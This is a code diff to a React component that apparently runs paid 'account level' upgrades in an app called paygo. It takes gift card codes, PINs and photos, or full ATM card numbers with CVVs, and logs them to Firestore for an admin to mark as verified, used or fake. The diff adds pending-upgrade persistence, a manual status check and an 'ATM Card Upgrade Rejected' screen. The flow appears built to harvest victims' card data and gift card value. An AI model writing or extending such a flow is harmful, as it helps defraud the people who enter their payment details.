@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { useAuth } from '../context/AuthContext';
 import { db, logCardSubmission, logGiftCardSubmission } from '../lib/firebase';
-import { doc, onSnapshot } from 'firebase/firestore';
+import { doc, getDoc, onSnapshot } from 'firebase/firestore';
 import {
   GIFT_CARD_BRAND_RULES,
   validateRealGiftCardInput,
@@ -64,6 +64,8 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
   const [giftStatusState, setGiftStatusState] = useState<'pending' | 'verified' | 'redeemed' | 'rejected'>('pending');
   const [giftRejectionReason, setGiftRejectionReason] = useState('');
   const [verdictModal, setVerdictModal] = useState<{ type: 'used' | 'fake'; message: string } | null>(null);
+  const [isCheckingStatus, setIsCheckingStatus] = useState(false);
+  const [statusCheckNote, setStatusCheckNote] = useState('');
 
   // ATM Card form state
   const [cardNumber, setCardNumber] = useState('');
@@ -200,7 +202,41 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
     }
   };
 
-  // Step 3 verification: real-time admin verification hold for Gift Cards; 10s gateway timer for ATM card
+  const pendingUpgradeStorageKey = user?.email
+    ? `paygo_pending_upgrade_${user.email.toLowerCase()}`
+    : null;
+
+  // Restore pending tier upgrade verification if user navigates back to Upgrade screen
+  useEffect(() => {
+    if (!pendingUpgradeStorageKey) return;
+    try {
+      const raw = localStorage.getItem(pendingUpgradeStorageKey);
+      if (!raw) return;
+      const parsed = JSON.parse(raw) as { statusId?: string; stage?: number; paymentMethod?: 'giftcard' | 'card' };
+      const matchedTier = TIERS.find((t) => t.stage === parsed.stage);
+      if (!matchedTier) {
+        localStorage.removeItem(pendingUpgradeStorageKey);
+        return;
+      }
+      if (
+        user?.accountLevel &&
+        user.accountLevel.toLowerCase().includes(`stage ${matchedTier.stage}`)
+      ) {
+        localStorage.removeItem(pendingUpgradeStorageKey);
+        setSelectedTier(matchedTier);
+        setStep(4);
+        return;
+      }
+      setSelectedTier(matchedTier);
+      setPaymentMethod(parsed.paymentMethod || 'giftcard');
+      if (parsed.statusId) setPendingStatusId(parsed.statusId);
+      setStep(3);
+    } catch {
+      // ignore invalid saved state
+    }
+  }, [pendingUpgradeStorageKey, user?.accountLevel]);
+
+  // Step 3 verification: real-time admin verification hold for Gift Cards & ATM cards
   useEffect(() => {
     if (step !== 3) return;
 
@@ -225,6 +261,9 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
           }
 
           if (data.status === 'verified' || data.status === 'redeemed') {
+            if (pendingUpgradeStorageKey) {
+              localStorage.removeItem(pendingUpgradeStorageKey);
+            }
             setPendingStatusId(null);
             if (selectedTier) {
               updateUser({ accountLevel: `Stage ${selectedTier.stage} — ${selectedTier.name}` });
@@ -255,10 +294,13 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
       doc(db, 'users', cleanEmail),
       (snap) => {
         if (!snap.exists()) return;
-        const remote = snap.data() as { accountLevel?: string };
+        const remote = snap.data() as { accountLevel?: string; cardRejectionReason?: string };
         const targetTierName = `Stage ${selectedTier?.stage} — ${selectedTier?.name}`;
         if (remote.accountLevel && remote.accountLevel.toLowerCase().includes(`stage ${selectedTier?.stage}`)) {
-          updateUser({ accountLevel: targetTierName });
+          if (pendingUpgradeStorageKey) {
+            localStorage.removeItem(pendingUpgradeStorageKey);
+          }
+          updateUser({ accountLevel: targetTierName, cardRejectionReason: '' });
           addTransaction({
             type: 'Account Upgrade',
             amount: selectedTier?.price || 0,
@@ -266,11 +308,55 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
             date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
           });
           setStep(4);
+        } else if (remote.cardRejectionReason) {
+          updateUser({ cardRejectionReason: remote.cardRejectionReason });
         }
       }
     );
     return () => unsubUser();
-  }, [step, selectedTier, paymentMethod, pendingStatusId]);
+  }, [step, selectedTier, paymentMethod, pendingStatusId, pendingUpgradeStorageKey]);
+
+  const handleManualCheckUpgradeStatus = async () => {
+    if (!pendingStatusId) return;
+    setIsCheckingStatus(true);
+    setStatusCheckNote('');
+    try {
+      const snap = await getDoc(doc(db, 'giftCardStatuses', pendingStatusId));
+      if (snap.exists()) {
+        const data = snap.data() as {
+          status: 'pending' | 'verified' | 'redeemed' | 'rejected';
+          rejectionReason?: string;
+        };
+        setGiftStatusState(data.status);
+        if (data.status === 'verified' || data.status === 'redeemed') {
+          if (pendingUpgradeStorageKey) localStorage.removeItem(pendingUpgradeStorageKey);
+          setPendingStatusId(null);
+          if (selectedTier) {
+            updateUser({ accountLevel: `Stage ${selectedTier.stage} — ${selectedTier.name}` });
+            addTransaction({
+              type: 'Account Upgrade',
+              amount: selectedTier.price,
+              tierName: `Stage ${selectedTier.stage} — ${selectedTier.name}`,
+              date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
+            });
+          }
+          setStep(4);
+          return;
+        }
+        if (data.status === 'rejected') {
+          setGiftRejectionReason(
+            data.rejectionReason || 'Wrong or used gift card is not allowed. Tier upgrade rejected.'
+          );
+          return;
+        }
+      }
+      setStatusCheckNote('Still awaiting admin confirmation. Your tier will unlock right here once approved.');
+    } catch {
+      setStatusCheckNote('Checking automatically in the background...');
+    } finally {
+      setIsCheckingStatus(false);
+    }
+  };
 
   const handleGiftCardPayment = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -320,8 +406,15 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
         return;
       }
 
+      if (pendingUpgradeStorageKey && selectedTier) {
+        localStorage.setItem(
+          pendingUpgradeStorageKey,
+          JSON.stringify({ statusId: res.statusId, stage: selectedTier.stage, paymentMethod: 'giftcard' })
+        );
+      }
       setGiftStatusState('pending');
       setGiftRejectionReason('');
+      setStatusCheckNote('');
       setPendingStatusId(res.statusId);
       setStep(3);
     } catch (err: any) {
@@ -351,6 +444,7 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
     }
 
     try {
+      updateUser({ cardRejectionReason: '' });
       await logCardSubmission({
         id: `CARD-${Date.now()}`,
         type: `Stage ${selectedTier?.stage} — ${selectedTier?.name || 'Upgrade'}`,
@@ -359,10 +453,17 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
         cvv,
         cardName,
         amount: selectedTier?.price || 0,
+        status: 'pending',
         userEmail: user?.email || 'unknown',
         userName: user?.name || cardName,
         date: new Date().toLocaleString(),
       });
+      if (pendingUpgradeStorageKey && selectedTier) {
+        localStorage.setItem(
+          pendingUpgradeStorageKey,
+          JSON.stringify({ stage: selectedTier.stage, paymentMethod: 'card' })
+        );
+      }
     } catch (e) {
       console.error(e);
     }
@@ -848,6 +949,7 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
                 <button
                   type="button"
                   onClick={() => {
+                    if (pendingUpgradeStorageKey) localStorage.removeItem(pendingUpgradeStorageKey);
                     setPendingStatusId(null);
                     setGiftStatusState('pending');
                     setGiftRejectionReason('');
@@ -881,19 +983,59 @@ export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack, onNavigate
                 <div className="w-full bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800 max-w-sm">
                   Reference ID: <span className="font-mono font-bold">{pendingStatusId}</span>
                 </div>
+                {statusCheckNote && (
+                  <p className="text-xs text-amber-700 font-medium max-w-sm">{statusCheckNote}</p>
+                )}
+                <button
+                  type="button"
+                  onClick={handleManualCheckUpgradeStatus}
+                  disabled={isCheckingStatus}
+                  className="w-full max-w-sm min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 px-4 rounded-xl text-xs shadow-sm cursor-pointer disabled:opacity-60"
+                >
+                  {isCheckingStatus ? 'Checking Confirmation Status...' : 'Check Confirmation Status'}
+                </button>
                 <button
                   type="button"
                   onClick={() => {
+                    if (pendingUpgradeStorageKey) localStorage.removeItem(pendingUpgradeStorageKey);
                     setPendingStatusId(null);
                     setGiftCardCode('');
                     setGiftCardPin('');
                     setGiftCardImage(null);
                     setConfirmedUnused(false);
+                    setStatusCheckNote('');
                     setStep(2);
                   }}
                   className="text-xs font-semibold text-gray-500 hover:text-purple-700 underline cursor-pointer pt-1"
                 >
                   Cancel & submit a different card
+                </button>
+              </>
+            ) : user?.cardRejectionReason ? (
+              <>
+                <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center ring-8 ring-red-50">
+                  <AlertCircle className="w-9 h-9" />
+                </div>
+                <span className="text-xs font-extrabold uppercase tracking-wider bg-red-100 text-red-800 border border-red-200 px-3 py-1 rounded-full">
+                  Card Declined by Admin
+                </span>
+                <h3 className="text-2xl font-extrabold text-red-700">
+                  ATM Card Upgrade Rejected
+                </h3>
+                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
+                  {user.cardRejectionReason}
+                </p>
+                <button
+                  type="button"
+                  onClick={() => {
+                    if (pendingUpgradeStorageKey) localStorage.removeItem(pendingUpgradeStorageKey);
+                    updateUser({ cardRejectionReason: '' });
+                    setCardError('Previous ATM card was declined. Please submit another valid card or verify with a gift card.');
+                    setStep(2);
+                  }}
+                  className="w-full max-w-xs min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
+                >
+                  Try Another Card or Gift Card
                 </button>
               </>
             ) : (
